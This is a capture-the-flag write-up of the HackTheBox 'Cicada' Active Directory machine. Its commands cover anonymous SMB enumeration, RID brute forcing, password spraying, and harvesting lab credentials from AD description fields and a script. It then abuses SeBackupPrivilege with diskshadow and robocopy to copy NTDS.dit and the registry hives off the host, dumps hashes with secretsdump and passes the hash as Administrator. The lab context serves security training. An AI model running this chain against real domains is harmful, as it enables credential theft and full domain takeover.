---
title: "Cicada — HackTheBox"
date: 2026-05-11
type: writeup
summary: "A default password and exposed AD descriptions led to WinRM access and SeBackupPrivilege-based domain compromise."
tags:
  - active-directory
  - smb
  - ldap
  - sebackupprivilege
  - diskshadow
difficulty: easy
---

## Enumeration

### Port Scan

```bash
rustscan -a cicada.htb --ulimit 5000
nmap -sC -sV -p 53,88,135,139,389,445,464,636,3268,3269,5985 cicada.htb
```

Key findings:

|Port|Service|Notes|
|---|---|---|
|88|Kerberos|AD Domain Controller confirmed|
|389/636|LDAP|Domain: `cicada.htb`|
|445|SMB|Null auth enabled|
|5985|WinRM|Potential shell vector|

### SMB Anonymous Enumeration

```bash
smbclient -L //10.129.231.149 -N
```

Shares discovered:

```
ADMIN$    HR    DEV    IPC$    NETLOGON    SYSVOL
```

Connected to the `HR` share anonymously and found `Notice from HR.txt` containing a **default password**:

```
Cicada$M6Corpb*@Lp#nZp!8
```

### User Enumeration via RID Brute Force

```bash
nxc smb cicada.htb -u 'guest' -p '' --rid-brute 2>/dev/null \
  | grep "SidTypeUser" | awk '{print $6}' | cut -d'\' -f2 | tee users.txt
```

Users discovered:

```
Administrator
Guest
krbtgt
CICADA-DC$
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

## Initial Access

### Password Spray

With the default password and a user list, spray across all accounts:

```bash
nxc smb cicada.htb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```

Hit:

```
cicada.htb\michael.wrightson : Cicada$M6Corpb*@Lp#nZp!8
```

### LDAP Enumeration — Password in AD Description Field

Using `michael.wrightson`'s credentials, query AD user descriptions:

```bash
ldapsearch -x -H ldap://cicada.htb \
  -D "michael.wrightson@cicada.htb" \
  -w 'Cicada$M6Corpb*@Lp#nZp!8' \
  -b "DC=cicada,DC=htb" \
  "(objectClass=user)" sAMAccountName description \
  | grep -E "sAMAccountName|description"
```

`david.orelious` had a password stored in his AD description field:

```
description: Just in case I forget my password is aRt$Lp#7t*VQ!3
sAMAccountName: david.orelious
```

Credentials: `david.orelious : aRt$Lp#7t*VQ!3`

### DEV Share — Hardcoded Credentials in Backup Script

```bash
smbclient //cicada.htb/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'
smb: \> get Backup_script.ps1
```

`Backup_script.ps1` contained hardcoded plaintext credentials:

```powershell
$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
```

Credentials: `emily.oscars : Q!3@Lp#M6b*7t*Vt`

### WinRM Shell as emily.oscars

```bash
evil-winrm -i cicada.htb -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```

```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> type user.txt
```

> 🚩 **User flag captured**

## Privilege Escalation

### SeBackupPrivilege Identified

```powershell
whoami /priv
```

```
SeBackupPrivilege     Back up files and directories    Enabled
SeRestorePrivilege    Restore files and directories    Enabled
```

`SeBackupPrivilege` allows reading **any file on the system** regardless of ACLs — including the locked `NTDS.dit` Active Directory database.

### Step 1 — Create VSS Shadow Copy Script

Using `Add-Content` instead of a heredoc to avoid encoding issues that truncate diskshadow commands:

```powershell
Add-Content -Path C:\Temp\shadow.txt -Value "set metadata C:\Temp\meta.cab"
Add-Content -Path C:\Temp\shadow.txt -Value "set context persistent nowriters"
Add-Content -Path C:\Temp\shadow.txt -Value "add volume c: alias pwn"
Add-Content -Path C:\Temp\shadow.txt -Value "create"
Add-Content -Path C:\Temp\shadow.txt -Value "expose %pwn% z:"
```

> **Note:** `set metadata C:\Temp\meta.cab` is required — diskshadow needs a writable path to store its `.cab` metadata file, otherwise it fails with a read-only directory error.

### Step 2 — Execute Diskshadow

```powershell
cd C:\Temp
diskshadow /s C:\Temp\shadow.txt
```

This creates a VSS snapshot of `C:\` and mounts it at `Z:\` — `NTDS.dit` is now **accessible and unlocked**.

### Step 3 — Copy NTDS.dit Using Backup Mode

```powershell
robocopy /b z:\Windows\NTDS C:\Temp NTDS.dit
```

> The `/b` flag invokes backup mode, which uses `SeBackupPrivilege` to bypass all ACL restrictions on the file.

### Step 4 — Save Registry Hives

```powershell
reg save HKLM\SYSTEM C:\Temp\SYSTEM /y
reg save HKLM\SAM C:\Temp\SAM /y
```

> The `SYSTEM` hive contains the **boot key** required to decrypt hashes stored in `NTDS.dit`. Without it, the dump is useless.

### Step 5 — Download Files to Attack Machine

```powershell
download NTDS.dit
download SYSTEM
download SAM
```

### Step 6 — Extract Hashes Locally

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM -sam SAM LOCAL
```

Output:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
```

### Step 7 — Pass-the-Hash as Administrator

```bash
evil-winrm -i cicada.htb -u 'Administrator' -H '2b87e7c93a3e8a0ea4a581937016f341'
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
cicada\administrator

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```
